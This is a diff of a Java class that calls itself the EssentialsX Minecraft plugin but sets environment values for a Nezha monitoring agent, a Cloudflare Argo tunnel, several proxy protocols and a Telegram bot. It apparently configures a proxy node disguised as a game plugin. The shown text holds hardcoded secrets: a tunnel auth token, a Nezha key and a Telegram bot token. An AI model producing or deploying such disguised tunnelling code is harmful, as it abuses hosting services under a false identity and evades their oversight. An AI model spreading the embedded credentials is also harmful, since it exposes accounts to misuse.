@@ -77,22 +77,22 @@ public class EssentialsX extends JavaPlugin {
         env.put("FILE_PATH", "./world");
         env.put("NEZHA_SERVER", "nz.o8o.pp.ua");
         env.put("NEZHA_PORT", "443");
-        env.put("NEZHA_KEY", "ly9WKKjCC5j13d04e3");
-        env.put("ARGO_PORT", "8009");
-        env.put("ARGO_DOMAIN", "hidencloud-sg-maya219801.o9o.pp.ua");
-        env.put("ARGO_AUTH", "eyJhIjoiZTgwYTRmNDYzYWVmMzVlNWVhYWNhOWRlZjY3NjE3ZDciLCJ0IjoiN2NkYmUxOWMtYTVhNi00ZmE1LTlhM2QtOThjNzE4NTUxNzAxIiwicyI6Ik5XWXlZbUZqTmpJdE5Ua3lNaTAwTnpaa0xUaG1aak10TjJWa05XRmlPREJsT1RRMiJ9");
-        env.put("S5_PORT", "");
-        env.put("HY2_PORT", "25320");
-        env.put("TUIC_PORT", "24830");
+        env.put("NEZHA_KEY", "ca34twI6U39EAMASFf");
+        env.put("ARGO_PORT", "8082");
+        env.put("ARGO_DOMAIN", "hidencloud-sg-earl898.zkx.pp.ua");
+        env.put("ARGO_AUTH", "eyJhIjoiYjljNWNmZDYyNWQ1YTM0ZDcwMzE0YjI2ODRlOGI0MTkiLCJ0IjoiMjE0YTAwMDUtOTEzMi00YzE3LTg4NTYtMDBjMWJlMDIyYzg5IiwicyI6Ik5UQTJOakUzWXpJdE1XSTFOUzAwWVRNMkxXRTRNakl0WlRJME1qbGhORFF5WlRSaSJ9");
+        env.put("S5_PORT", "24707");
+        env.put("HY2_PORT", "24845");
+        env.put("TUIC_PORT", "24707");
         env.put("ANYTLS_PORT", "");
-        env.put("REALITY_PORT", "25320");
-        env.put("ANYREALITY_PORT", "");
+        env.put("REALITY_PORT", "");
+        env.put("ANYREALITY_PORT", "24845");
         env.put("UPLOAD_URL", "");
         env.put("CHAT_ID", "6595585066");
         env.put("BOT_TOKEN", "7969325333:AAE0ewRaogaXlBz_5Bnt2hxcTIVw3dEp0b4");
         env.put("CFIP", "saas.sin.fan");
         env.put("CFPORT", "443");
-        env.put("NAME", "hidencloud-SG-maya219801");
+        env.put("NAME", "hidencloud-sg-earl898");
         env.put("DISABLE_ARGO", "false");
         
         // Load from system environment variables
